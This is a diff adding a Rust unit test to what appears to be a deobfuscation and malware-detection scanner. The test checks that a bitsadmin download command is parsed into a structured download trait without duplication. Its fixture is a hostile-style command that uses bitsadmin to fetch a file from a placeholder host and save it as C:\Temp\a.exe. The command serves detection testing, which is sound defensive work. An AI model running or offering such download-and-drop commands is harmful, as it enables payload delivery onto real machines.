@@ -10075,6 +10075,36 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_addfile_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /create j1 & bitsadmin /addfile j1 https://bits-addfile-scan.example/a.txt C:\Temp\a.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile-scan.example/a.txt" && dst == "C:\\Temp\\a.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured bitsadmin addfile download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("bits-addfile-scan.example")))
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "bitsadmin addfile URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_liberal_url_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
